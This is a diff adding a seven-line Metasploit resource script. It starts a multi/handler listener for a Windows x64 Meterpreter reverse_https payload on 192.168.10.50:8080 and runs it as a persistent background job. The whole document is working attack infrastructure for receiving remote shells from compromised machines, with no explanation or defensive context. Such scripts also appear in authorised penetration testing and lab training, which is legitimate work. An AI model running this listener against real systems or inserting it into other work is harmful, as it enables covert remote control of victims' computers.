@@ -1,0 +1,7 @@
+
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.10.50
+set LPORT 8080
+set ExitOnSession false
+exploit -j -z
